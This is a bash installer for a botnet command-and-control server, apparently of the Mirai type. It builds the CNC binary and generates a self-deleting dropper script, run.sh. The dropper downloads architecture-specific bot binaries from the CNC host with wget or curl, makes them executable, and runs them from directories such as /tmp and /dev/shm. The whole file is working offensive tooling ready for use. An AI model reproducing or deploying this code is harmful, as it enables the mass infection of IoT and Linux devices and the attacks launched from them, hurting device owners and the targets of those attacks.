#!/bin/bash
exec &> >(tee install.log)
set -e

INFO="\033[1;34m[*]\033[0m"
OK="\033[1;32m[+]\033[0m"
FAIL="\033[1;31m[-]\033[0m"

if [[ $EUID -ne 0 ]]; then
  echo -e "$FAIL This script must be run as root"
  exit 1
fi

read -p "$(echo -e "$INFO Enter CNC server IP or domain: ")" SERVER_IP
if [[ -z "$SERVER_IP" ]]; then
  echo -e "$FAIL IP/domain is required"
  exit 1
fi
echo ""

# ── Dependencies ────────────────────────────────────────
echo -e "$INFO Checking dependencies..."

if ! command -v go &>/dev/null; then
  echo -e "$INFO Installing Go 1.24.0..."
  wget -q --no-check-certificate \
    "https://go.dev/dl/go1.24.0.linux-amd64.tar.gz" -O /tmp/go.tar.gz
  tar -C /usr/local -xzf /tmp/go.tar.gz
  rm /tmp/go.tar.gz
  ln -sf /usr/local/go/bin/go /usr/local/bin/go
  ln -sf /usr/local/go/bin/gofmt /usr/local/bin/gofmt
fi
echo -e "$OK Go $(go version | awk '{print $3}')"

if ! command -v zig &>/dev/null; then
  echo -e "$INFO Installing zig 0.13.0..."
  cd /tmp
  wget -q --no-check-certificate \
    "https://ziglang.org/download/0.13.0/zig-linux-x86_64-0.13.0.tar.xz" -O zig.tar.xz
  tar xf zig.tar.xz
  rm zig.tar.xz
  mkdir -p /usr/local/lib/zig
  mv zig-linux-x86_64-0.13.0/* /usr/local/lib/zig/
  rmdir zig-linux-x86_64-0.13.0
  ln -sf /usr/local/lib/zig/zig /usr/local/bin/zig
  cd -
fi
echo -e "$OK zig $(zig version)"
echo ""

# ── Project root ────────────────────────────────────────
cd "$(dirname "$0")"
ROOT="$PWD"
mkdir -p bin

# ── Build CNC server ────────────────────────────────────
echo -e "$INFO Building CNC server..."
go build -ldflags="-s -w" -o bin/cnc ./Server/
echo -e "$OK bin/cnc"

# ── Generate run.sh (wget/curl dropper script) ──
echo -e "$INFO Generating run.sh..."
cat <<EOF > run.sh
#!/bin/sh

ARCHS="mips mipsel x86 x86_64 armv7l armv6l armv5l i686 ppc64"
CNC_IP="$SERVER_IP"

x() {
    local a=\$1
    local b=\$(head /dev/urandom | tr -dc a-z0-9 | head -c 6)
    for p in /tmp /var/run /dev/shm /mnt /root /; do
        cd \$p 2>/dev/null || continue
        if command -v wget >/dev/null; then
            wget -q http://\$CNC_IP/\$a -O \$b
        elif command -v curl >/dev/null; then
            curl -s http://\$CNC_IP/\$a -o \$b
        fi
        [ -f "\$b" ] && chmod +x "\$b" && "./\$b" >/dev/null 2>&1 && rm -f "\$b" && break
    done
}

for arch in \$ARCHS; do x "\$arch"; done
(sleep 2; rm -f "\$0") &
EOF
chmod +x run.sh
mkdir -p /var/www/html 2>/dev/null
mv run.sh /var/www/html 2>/dev/null || echo -e "$INFO run.sh generated at ./run.sh (mv to /var/www/html failed, need root)"
echo -e "$OK run.sh"

# ── Summary ─────────────────────────────────────────────
echo ""
echo -e "\033[1;37m═══════════════════════════\033[0m"
echo -e "$OK Install complete"
echo ""
echo -e "  CNC server:  \033[1;37mbin/cnc\033[0m"
echo -e "  Server IP:   \033[1;33m$SERVER_IP\033[0m"
echo -e "  Bot port:    9111"
echo -e "  SSH port:    2222"
echo ""
echo -e "  Run: \033[1;32m./bin/cnc\033[0m"
echo -e "  Build bot bins later via the \033[1;33mpayload\033[0m command inside CNC"
